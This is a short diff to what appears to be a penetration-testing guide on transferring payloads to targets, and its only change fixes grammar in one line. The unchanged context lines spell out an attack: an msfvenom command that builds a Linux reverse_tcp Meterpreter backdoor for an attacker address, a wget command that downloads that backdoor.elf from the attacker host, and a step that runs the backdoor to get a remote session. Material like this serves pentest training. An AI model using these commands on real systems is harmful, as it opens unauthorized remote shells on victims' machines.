@@ -53,7 +53,7 @@ I transferred a payload created by msfvenom, but you can transfer all files you 
  - **Execute the backdoor.exe on the Target and you will have a Meterpreter Session on your Machine.**
 
 ### Linux System
-It's the same thing but u have to change the creation of payload and use another tool for download the file
+It’s the same thing, but you have to change the payload creation and use another tool to download the file.
  - **Command to generate a malicious payload (reverse_tcp): msfvenom -p linux/meterpreter/reverse_tcp LHOST=10.10.9.3 LPORT=4444 -f elf > 'backdoor.elf' (set LPORT and LHOST where you want to receive the connection. Default is x86, if need x64, you have to specify it) <br>**
  - **Download the payload with wget: wget http://10.10.9.3/backdoor.elf <br>**
 
